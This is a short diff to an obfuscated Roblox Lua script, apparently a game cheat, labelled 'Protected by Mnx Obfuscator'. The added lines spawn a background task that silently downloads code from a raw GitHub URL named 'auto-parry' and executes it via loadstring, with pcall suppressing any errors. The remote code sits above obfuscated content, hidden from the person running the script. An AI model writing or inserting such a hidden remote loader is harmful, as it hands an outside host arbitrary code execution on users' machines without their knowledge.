@@ -1,3 +1,8 @@
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/hasanainmakhluf/roblox/refs/heads/main/auto-parry"))()
+    end)
+end)
 -- Protected by Mnx Obfuscator | Public Enemy
 local lGuqkzxsC7C6xJ6DBe=bit32.bxor(85,20)
 local dS4zI_oF9D19NoWR3L=564
